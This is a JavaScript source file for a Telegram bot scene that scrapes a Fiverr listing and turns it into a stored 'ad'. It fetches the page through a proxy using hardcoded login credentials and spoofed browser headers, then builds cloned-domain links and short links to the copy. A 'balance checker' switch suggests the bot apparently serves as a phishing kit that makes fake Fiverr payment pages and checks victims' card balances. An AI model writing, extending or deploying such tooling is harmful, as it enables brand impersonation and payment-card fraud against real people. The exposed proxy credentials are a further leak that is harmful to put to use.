const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service, MyDomains, Profiles } = require("../../database");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const fiverr_com_domains = ["www.fiverr.com", "fiverr.com"];

const scene = new WizardScene(
  "fiverr_link_handler",
  async (ctx) => {
    try {
      // Extract the URL from the user's message
      if (!ctx.message || !ctx.message.text) {
        await ctx.reply(
          "❌ Пожалуйста, отправьте ссылку на объявление fiverr.com"
        );
        return ctx.scene.leave();
      }
      let url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.reply("❌ Введите валидную ссылку на fiverr.com");
        return ctx.scene.leave(); // безопасный выход из сцены
      }

      // если URL всё равно оказался невалидным (например, undefined)
      if (!url || !fiverr_com_domains.includes(url.host)) {
        await ctx.reply("❌ Введите ссылку на объявление fiverr.com");
        return ctx.scene.leave();
      }

      log(ctx, `отправил ссылку для парсинга fiverr.com (${url.href})`);
      // Используем строку куки в заголовке

      const SocksProxyAgent = require("socks-proxy-agent");
      const torProxyAgent = new SocksProxyAgent(
        "socks://AK2GNTYBLN-country-nl-sid-ciwx71ax4p44-filter-medium:DNCDJ2JM83@resident.proxyshard.com:2080"
      );

      // Используем строку куки в заголовке
      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", // Windows Chrome
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", // Mac Safari
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", // Linux Chrome
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Mobile Safari/537.36", // Android Chrome
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1", // iPhone Safari
      ];

      // 80% шанс выбрать первый User-Agent (Windows Chrome), 20% случайный другой
      const randomUserAgent =
        Math.random() < 0.8
          ? userAgents[0]
          : userAgents[Math.floor(Math.random() * (userAgents.length - 1)) + 1]; // Выбираем из остальных

      let ad;
      try {
        ad = await axios.get(encodeURI(url.href), {
          httpAgent: torProxyAgent,
          httpsAgent: torProxyAgent,
          timeout: 5000, // ⏳ Таймаут 7 секунд (можешь поставить любое число)

          headers: {
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": randomUserAgent,
            Referer: "https://www.google.com/",
            Connection: "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            TE: "trailers",
            "Accept-CH": "*",
            "If-None-Match": 'W/"152421-Bdn7omIktOzWnDp0UJRq6S5ukVQ"',
            Priority: "u=0, i",
            "Sec-Ch-Ua":
              '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
          },
        });
      } catch (err) {
        if (err.code === "ECONNABORTED") {
          await ctx.reply("⏳ Превышено время ожидания ответа.");
        } else {
          await ctx.reply("❌ Ошибка при парсинге объявления.");
        }

        return ctx.scene.leave(); // ← вот это обязательно добавить
      }

      $ = cheerio.load(ad.data);
      const pricePrimary =
        $("p.wt-text-title-larger")
          .first()
          .text()
          .replace(/Цена:|Price:/i, "")
          .trim() || null;
      const priceFallback =
        $('div[data-selector="price-only"] p.wt-text-title-larger')
          .text()
          .trim() || null;
      const priceStyle = $("span._5plgh7k").first().text().trim() || null;

      const price = pricePrimary || priceFallback || priceStyle;

      const info = {
        title:
          $('meta[property="og:title"]')
            .attr("content")
            ?.replace(/^[^:]*:\s*/, "") || "Title not found",

        price: price,
        logo: $("img.profile-pict-img").first().attr("src") || null,
        adLink: url.href,
      };

      try {
        info.photo = $('[property="og:image"]').first().attr("content");
      } catch (err) {
        console.error("Ошибка при получении изображения:", err);
      }

      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        console.log(info);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление fiverr.com (${url.href})`);
      ctx.scene.state.data = info;

      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
   async (ctx) => {
  try {
    const data = ctx.callbackQuery?.data;

    if (ctx.callbackQuery) {
      await ctx.answerCbQuery();
    }

    if (data === "cancel") {
      await ctx.scene.leave();
      return;
    }

    if (!["true", "false"].includes(data)) {
      await ctx.reply(
        "❌ Пожалуйста, выберите один из предложенных вариантов.",
        {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        }
      );
      return;
    }

    ctx.scene.state.data.balanceChecker = data === "true";
    return ctx.wizard.nextStep();
  } catch (err) {
    console.log(err);
    await ctx.reply("❌ Ошибка").catch((err) => err);
    return ctx.scene.leave();
  }
},
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "fiverr_com",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      // function generateId(length = 7) { // Set default length to 5
      //   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      //   let result = '';
      //   const charactersLength = characters.length;
      //   for (let i = 0; i < length; i++) {
      //     result += characters.charAt(Math.floor(Math.random() * charactersLength));
      //   }
      //   return result;
      // }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "fiverr_com",
      });

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === "ECONNABORTED") {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (
          error.code === "ECONNREFUSED" ||
          error.code === "ENOTFOUND"
        ) {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback
      }

      const personalDomainLink = domains
        ? `https://${domains.domain}/${ad.id}`
        : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную
      });

      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );

      // Собираем сообщение
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
